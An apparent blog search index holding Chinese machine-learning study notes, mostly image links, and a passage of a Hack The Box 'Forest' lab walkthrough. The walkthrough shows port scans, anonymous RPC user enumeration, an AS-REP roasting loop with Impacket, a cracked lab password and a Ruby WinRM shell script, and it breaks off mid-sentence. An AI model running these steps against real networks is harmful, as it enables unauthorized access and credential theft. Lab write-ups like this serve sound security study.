<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>机器学习手推笔记_09高斯混合分布</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-09%E9%AB%98%E6%96%AF%E6%B7%B7%E5%90%88%E5%88%86%E5%B8%83/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-09%E9%AB%98%E6%96%AF%E6%B7%B7%E5%90%88%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="9-1-高斯混合模型"><a href="#9-1-高斯混合模型" class="headerlink" title="9.1 高斯混合模型"></a>9.1 高斯混合模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023298496-092515100292_4IMG_20190604_202310.jpg"></p><h2 id="9-2-EM求解-e-step"><a href="#9-2-EM求解-e-step" class="headerlink" title="9.2 EM求解_e step"></a>9.2 EM求解_e step</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023310986-092515100292_5IMG_20190604_202320.jpg"></p><h2 id="9-3-EM求解-m-step"><a href="#9-3-EM求解-m-step" class="headerlink" title="9.3 EM求解_m step"></a>9.3 EM求解_m step</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023320665-092515100292_3IMG_20190604_201943.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_08 EM算法</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-08-EM%E7%AE%97%E6%B3%95/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-08-EM%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="8-1-公式及收敛性"><a href="#8-1-公式及收敛性" class="headerlink" title="8.1 公式及收敛性"></a>8.1 公式及收敛性</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023145978-092515100292_0IMG_20190529_165754.jpg"></p><h2 id="8-2-公式导出-ELBO-KL-divergence"><a href="#8-2-公式导出-ELBO-KL-divergence" class="headerlink" title="8.2 公式导出_ELBO+KL divergence"></a>8.2 公式导出_ELBO+KL divergence</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023158952-092515100292_1IMG_20190529_165840.jpg"></p><h2 id="8-2-公式导出-ELBO-jensen-inequity"><a href="#8-2-公式导出-ELBO-jensen-inequity" class="headerlink" title="8.2 公式导出_ELBO+jensen inequity"></a>8.2 公式导出_ELBO+jensen inequity</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601023171832-092515100292_2IMG_20190529_165909.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_07概览图</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-07%E6%A6%82%E8%A7%88%E5%9B%BE/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-07%E6%A6%82%E8%A7%88%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="7-1-概率图"><a href="#7-1-概率图" class="headerlink" title="7.1 概率图"></a>7.1 概率图</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022611253-092515061020_1IMG_20190403_110204.jpg"></p><h2 id="7-2-贝叶斯网络-条件独立性"><a href="#7-2-贝叶斯网络-条件独立性" class="headerlink" title="7.2 贝叶斯网络_条件独立性"></a>7.2 贝叶斯网络_条件独立性</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022632234-092515061020_2IMG_20190403_110224.jpg"></p><h2 id="7-3-贝叶斯网络-D划分"><a href="#7-3-贝叶斯网络-D划分" class="headerlink" title="7.3 贝叶斯网络_D划分"></a>7.3 贝叶斯网络_D划分</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022698847-092515061020_11IMG_20190403_110636.jpg"></p><h2 id="7-4-贝叶斯网络-模型"><a href="#7-4-贝叶斯网络-模型" class="headerlink" title="7.4 贝叶斯网络_模型"></a>7.4 贝叶斯网络_模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022723002-092515061020_10IMG_20190403_110626.jpg"></p><h2 id="7-5-马尔可夫随机场"><a href="#7-5-马尔可夫随机场" class="headerlink" title="7.5 马尔可夫随机场"></a>7.5 马尔可夫随机场</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022735835-092515061020_3IMG_20190403_110406.jpg"></p><h2 id="7-6-推断"><a href="#7-6-推断" class="headerlink" title="7.6 推断"></a>7.6 推断</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022764651-092515061020_4IMG_20190403_110417.jpg"></p><h2 id="7-7-推断-Variable-Elimination"><a href="#7-7-推断-Variable-Elimination" class="headerlink" title="7.7 推断_Variable Elimination"></a>7.7 推断_Variable Elimination</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022785597-092515061020_5IMG_20190403_110428.jpg"></p><h2 id="7-8-推断-BP"><a href="#7-8-推断-BP" class="headerlink" title="7.8 推断_BP"></a>7.8 推断_BP</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022809190-092515061020_0IMG_20190403_093432.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022855282-092515061020_6IMG_20190403_110440.jpg"></p><h2 id="7-9-推断-Max-product"><a href="#7-9-推断-Max-product" class="headerlink" title="7.9 推断_Max-product"></a>7.9 推断_Max-product</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022842773-092515061020_7IMG_20190403_110502.jpg"></p><h2 id="7-10-推断-道德图"><a href="#7-10-推断-道德图" class="headerlink" title="7.10 推断_道德图"></a>7.10 推断_道德图</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022871448-092515061020_9IMG_20190403_110541.jpg"></p><h2 id="7-11-推断-因子图"><a href="#7-11-推断-因子图" class="headerlink" title="7.11 推断_因子图"></a>7.11 推断_因子图</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022883907-092515061020_8IMG_20190403_110530.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_06指数族分布</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-06%E6%8C%87%E6%95%B0%E6%97%8F%E5%88%86%E5%B8%83/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-06%E6%8C%87%E6%95%B0%E6%97%8F%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="6-1-指数族分布"><a href="#6-1-指数族分布" class="headerlink" title="6.1 指数族分布"></a>6.1 指数族分布</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022121930-092515023969_0IMG_20190313_000528.jpg"></p><h2 id="6-2-高斯分布的指数族形式"><a href="#6-2-高斯分布的指数族形式" class="headerlink" title="6.2 高斯分布的指数族形式"></a>6.2 高斯分布的指数族形式</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022193698-092515023969_4IMG_20190313_000922.jpg"></p><h2 id="6-3-对数分配函数与充分统计量的关系"><a href="#6-3-对数分配函数与充分统计量的关系" class="headerlink" title="6.3 对数分配函数与充分统计量的关系"></a>6.3 对数分配函数与充分统计量的关系</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022155314-092515023969_3IMG_20190313_000912.jpg"></p><h2 id="6-4-MLE与充分统计量的关系"><a href="#6-4-MLE与充分统计量的关系" class="headerlink" title="6.4 MLE与充分统计量的关系"></a>6.4 MLE与充分统计量的关系</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022155301-092515023969_2IMG_20190313_000835.jpg"></p><h2 id="6-5-最大熵"><a href="#6-5-最大熵" class="headerlink" title="6.5 最大熵"></a>6.5 最大熵</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601022193686-092515023969_1IMG_20190313_000650.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_05 SVM</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-05-SVM/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-05-SVM/</url>
    
    <content type="html"><![CDATA[<h2 id="5-1-硬间隔模型"><a href="#5-1-硬间隔模型" class="headerlink" title="5.1 硬间隔模型"></a>5.1 硬间隔模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021642578-092514574393_4IMG_20190306_222729.jpg"></p><h2 id="5-2-硬间隔模型求解"><a href="#5-2-硬间隔模型求解" class="headerlink" title="5.2 硬间隔模型求解"></a>5.2 硬间隔模型求解</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021658571-092514574393_3IMG_20190306_222712.jpg"></p><h2 id="5-3-硬间隔模型KKT条件"><a href="#5-3-硬间隔模型KKT条件" class="headerlink" title="5.3 硬间隔模型KKT条件"></a>5.3 硬间隔模型KKT条件</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021675796-092514574393_1IMG_20190306_222552.jpg"></p><h2 id="5-4-软间隔模型"><a href="#5-4-软间隔模型" class="headerlink" title="5.4 软间隔模型"></a>5.4 软间隔模型</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021783154-092514574393_2IMG_20190306_222612.jpg"></p><h2 id="5-5-约束优化问题"><a href="#5-5-约束优化问题" class="headerlink" title="5.5 约束优化问题"></a>5.5 约束优化问题</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021828380-092514574393_0IMG_20190306_222450.jpg"></p><h2 id="5-6-核方法"><a href="#5-6-核方法" class="headerlink" title="5.6 核方法"></a>5.6 核方法</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021875554-092514595735_0IMG_20190310_224259.jpg"></p><h2 id="5-7-正定核"><a href="#5-7-正定核" class="headerlink" title="5.7 正定核"></a>5.7 正定核</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021889779-092514595735_1IMG_20190310_224345.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_04降维</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-04%E9%99%8D%E7%BB%B4/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-04%E9%99%8D%E7%BB%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="4-1-降维"><a href="#4-1-降维" class="headerlink" title="4.1 降维"></a>4.1 降维</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020756837-092514490919_3IMG_20190306_162248.jpg"></p><h2 id="4-2-样本均值、方差的矩阵表示"><a href="#4-2-样本均值、方差的矩阵表示" class="headerlink" title="4.2 样本均值、方差的矩阵表示"></a>4.2 样本均值、方差的矩阵表示</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020785471-092514490919_2IMG_20190306_162148.jpg"></p><h2 id="4-3-PCA的两个角度"><a href="#4-3-PCA的两个角度" class="headerlink" title="4.3 PCA的两个角度"></a>4.3 PCA的两个角度</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021232492-092514490919_1IMG_20190306_162117.jpg"></p><h2 id="4-4-从SVD角度看PCA"><a href="#4-4-从SVD角度看PCA" class="headerlink" title="4.4 从SVD角度看PCA"></a>4.4 从SVD角度看PCA</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020804705-092514490919_4IMG_20190306_162312.jpg"></p><h2 id="4-5-从概率角度看PCA"><a href="#4-5-从概率角度看PCA" class="headerlink" title="4.5 从概率角度看PCA"></a>4.5 从概率角度看PCA</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601021281359-092514490919_0IMG_20190306_161930.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_03线性分类</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-03%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-03%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="3-1-线性分类"><a href="#3-1-线性分类" class="headerlink" title="3.1 线性分类"></a>3.1 线性分类</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020442873-092514410325_0IMG_20190224_222853.jpg"></p><h2 id="3-2-感知机"><a href="#3-2-感知机" class="headerlink" title="3.2 感知机"></a>3.2 感知机</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020455354-092514410325_1IMG_20190224_223155.jpg"></p><h2 id="3-3-线性判别分析"><a href="#3-3-线性判别分析" class="headerlink" title="3.3 线性判别分析"></a>3.3 线性判别分析</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020472233-092514410325_2IMG_20190224_223252.jpg"></p><h2 id="3-4-逻辑回归"><a href="#3-4-逻辑回归" class="headerlink" title="3.4 逻辑回归"></a>3.4 逻辑回归</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020487776-092514410325_3IMG_20190224_223433.jpg"></p><h2 id="3-5-高斯判别分析"><a href="#3-5-高斯判别分析" class="headerlink" title="3.5 高斯判别分析"></a>3.5 高斯判别分析</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020506006-092514410325_4IMG_20190224_223458.jpg"><br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020523613-092514410325_5IMG_20190224_223604.jpg"><br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020534725-092514410325_6IMG_20190224_223650.jpg"></p><h2 id="3-6-朴素贝叶斯"><a href="#3-6-朴素贝叶斯" class="headerlink" title="3.6 朴素贝叶斯"></a>3.6 朴素贝叶斯</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601020550698-092514410325_7IMG_20190224_230538.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_02线性回归</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-02%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-02%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
    
    <content type="html"><![CDATA[<h2 id="2-1-最小二乘法"><a href="#2-1-最小二乘法" class="headerlink" title="2.1 最小二乘法"></a>2.1 最小二乘法</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019877048-092514380564_0IMG_20190220_121812.jpg"></p><h2 id="2-2-从概率角度看最小二乘估计"><a href="#2-2-从概率角度看最小二乘估计" class="headerlink" title="2.2 从概率角度看最小二乘估计"></a>2.2 从概率角度看最小二乘估计</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019891849-092514380564_1IMG_20190220_123002.jpg"></p><h2 id="2-3-正则化-岭回归"><a href="#2-3-正则化-岭回归" class="headerlink" title="2.3 正则化_岭回归"></a>2.3 正则化_岭回归</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019829920-092514380564_2IMG_20190220_230614.jpg"></p><h2 id="2-4-从概率角度看岭回归"><a href="#2-4-从概率角度看岭回归" class="headerlink" title="2.4 从概率角度看岭回归"></a>2.4 从概率角度看岭回归</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601019909034-092514380564_3IMG_20190220_230740.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习手推笔记_01高斯分布</title>
    <link href="/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-01%E9%AB%98%E6%96%AF%E5%88%86%E5%B8%83/"/>
    <url>/2020/09/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%89%8B%E6%8E%A8%E7%AC%94%E8%AE%B0-01%E9%AB%98%E6%96%AF%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="1-频率派VS贝叶斯派"><a href="#1-频率派VS贝叶斯派" class="headerlink" title="1. 频率派VS贝叶斯派"></a>1. 频率派VS贝叶斯派</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018421187-092514235059_0IMG_20190218_193924.jpg"></p><h2 id="2-高斯分布"><a href="#2-高斯分布" class="headerlink" title="2. 高斯分布"></a>2. 高斯分布</h2><h3 id="2-1-MLE"><a href="#2-1-MLE" class="headerlink" title="2.1 MLE"></a>2.1 MLE</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018475337-092514235059_1IMG_20190218_201319.jpg"></p><h3 id="2-2-MLE的有偏与无偏"><a href="#2-2-MLE的有偏与无偏" class="headerlink" title="2.2 MLE的有偏与无偏"></a>2.2 MLE的有偏与无偏</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018490028-092514235059_2IMG_20190218_204014.jpg"></p><h3 id="2-3-从概率密度函数看多维高斯分布"><a href="#2-3-从概率密度函数看多维高斯分布" class="headerlink" title="2.3 从概率密度函数看多维高斯分布"></a>2.3 从概率密度函数看多维高斯分布</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018502496-092514235059_3IMG_20190218_230045.jpg"></p><h3 id="2-4-局限性"><a href="#2-4-局限性" class="headerlink" title="2.4 局限性"></a>2.4 局限性</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018512611-092514235059_4IMG_20190218_232452.jpg"></p><h3 id="2-5-已知联合概率求边缘概率和条件概率"><a href="#2-5-已知联合概率求边缘概率和条件概率" class="headerlink" title="2.5 已知联合概率求边缘概率和条件概率"></a>2.5 已知联合概率求边缘概率和条件概率</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018525888-092514235059_5IMG_20190219_131702.jpg"></p><h3 id="2-6-已知边缘和条件概率就联合概率"><a href="#2-6-已知边缘和条件概率就联合概率" class="headerlink" title="2.6 已知边缘和条件概率就联合概率"></a>2.6 已知边缘和条件概率就联合概率</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018537524-092514235059_6IMG_20190219_190052.jpg"></p><h3 id="2-7-杰森不等式"><a href="#2-7-杰森不等式" class="headerlink" title="2.7 杰森不等式"></a>2.7 杰森不等式</h3><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-25/1601018574177-092514235059_7IMG_20190219_192739.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>machine learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack the box: Forset</title>
    <link href="/2020/09/22/Hack-the-box-Forset/"/>
    <url>/2020/09/22/Hack-the-box-Forset/</url>
    
    <content type="html"><![CDATA[<p><img src="https://p0.ssl.qhimg.com/t01040622b2d71e783a.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于Hack the box：</strong><a href="https://www.hackthebox.eu/">Hack The Box</a>是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态<code>active</code>、<code>retired</code>。对于<code>retired</code>状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。</p><p><strong>关于Forest lab：</strong>我在寻找测试靶机的过程中，发现Forest在处于<code>retired</code>状态下依然可以访问，继承“白嫖一时爽，再一次更爽”的精神，今天决定对Forest下手。（前期已经白嫖过Sniper这个靶机，通过详情可参见我的上一篇安全客文章：）下图是对Sniper的简要介绍：</p><p><img src="https://p2.ssl.qhimg.com/t01a3102f9d3401b0f5.png"></p><p><img src="https://p5.ssl.qhimg.com/t014ee4fb53a8ba6db0.png"></p><p><strong>使用工具：</strong>kali、masscan、nmap、rpcclient、Impacket工具、necat、BloodHound工具、Apache、Samba、Aclpwn</p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>使用<code>masscan</code>对靶机Forest的ip：10.10.10.161 进行扫描:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01a777dd8e4966e96e.png"></p><p>发现一堆开放端口，貌似真的有点多。。。使用<code>nmap</code>收集对应端口的服务信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ nmap -n -v -Pn -p 389,135,139,49682,49674,49655,5985,3268,47001,49675,49667,53,464,636,49902,593,88,9389,49664,49666,48671,445,49701 -A --reason 10.10.10.161 -oN nmap.txt</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t011b2b0b254b27dae0.png"></p><p>发现端口53（dns）、88（kerberos）、5985（winrm）、389/3268（ldap）、135/139/445（rpc）等。从<code>3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</code>这条信息可以发现，靶机Forest应该是<code>htb.local</code>的域控制组。</p><p>尝试用RPC来枚举用户，使用<code>rpcclietn</code>连接，并获取用户了列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ rpcclient -U &quot;&quot; -N 10.10.10.161</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t016138144cbbd07b76.png"></p><p>获取组列表：</p><p><img src="https://p5.ssl.qhimg.com/t0100adbc0a5955dc81.png"></p><p>查看<code>Domain Admins</code>以及其中的<code>0x1f4</code>成员，并发现他是Administrator：</p><p><img src="https://p2.ssl.qhimg.com/t01d1e35a802a0fe9a1.png"></p><h2 id="0x03-获得低权限的shell"><a href="#0x03-获得低权限的shell" class="headerlink" title="0x03 获得低权限的shell"></a>0x03 获得低权限的shell</h2><blockquote><p>这里的思路是沿着Kerberos认证向下进行的：Kerberos是一种非常复杂的身份验证协议，但它还存在一些缺陷。对Windows域认证体系下的Kerberos认证不了解的小伙伴，可以学习知乎上的这篇文章——<a href="https://zhuanlan.zhihu.com/p/77873456">初识 Windows域认证体系 Kerberos认证</a> 。</p><p>其中之一的缺陷就是使得攻击者可以从kerberos服务器请求数据，并对响应进行暴力攻击以找出用户密码,这就是AS-REP Roast攻击，可以参见这篇文章——<a href="http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs</a> 。</p><p><img src="https://p3.ssl.qhimg.com/t010acf046da3b041c3.png"></p></blockquote><p>为了验证漏洞，我开始浏览Impacket工具，找到<code>GetNPUsers.py</code>：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py</a> 。这个脚本的功能是遍历用户列表，并找到那些<code>Do not require Kerberos preauthentication</code>即“不需要kerberos预验证”的用户。</p><p>我将所有用户保存在<code>users.txt</code>中，并执行<code>GetNPUsers.py</code>，成功获取到<code>svc-alfresco</code>账户的<code>TGT</code>hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ for user in $(cat users.txt);do ./GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/$&#123;user&#125;; done</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t012924f4f6d812f4fb.png"></p><p><img src="https://p0.ssl.qhimg.com/t013ae5e13aa0d298da.png"></p><p>下面就是破解hash，使用<code>hashcat</code>进行破解，得到明文密码为<code>s3rvice</code>:</p><p><img src="https://p2.ssl.qhimg.com/t01c72e6a054f030e21.png"></p><p>现在我已经拥有了一个完整的账户认证<code>svc-alfresco:s3rvice</code>，下面就是找到交互点。在nmap执行结果中，我发现端口5985是打开的，并开启<code>winrm</code>服务。为了与该服务交互，创建了一个winrm-shell脚本：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;winrm&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new(</span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">&#x27;http://10.10.10.161:5985/wsman&#x27;</span>,</span><br><span class="line">  <span class="symbol">user:</span> <span class="string">&#x27;svc-alfresco&#x27;</span>,</span><br><span class="line">  <span class="symbol">password:</span> <span class="string">&#x27;s3rvice&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">&quot;exit\n&quot;</span> <span class="keyword">do</span></span><br><span class="line">        print <span class="string">&quot;PS &gt; &quot;</span></span><br><span class="line">        command = gets        </span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    puts <span class="string">&quot;Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>执行交互，成功获取到<code>svc-alfresco</code>的shell：</p><p><img src="https://p3.ssl.qhimg.com/t0167b9a4c0dd0987c0.png"></p><p><strong>- 进入<code>svc-alfresco</code>用户的桌面，拿到<code>user 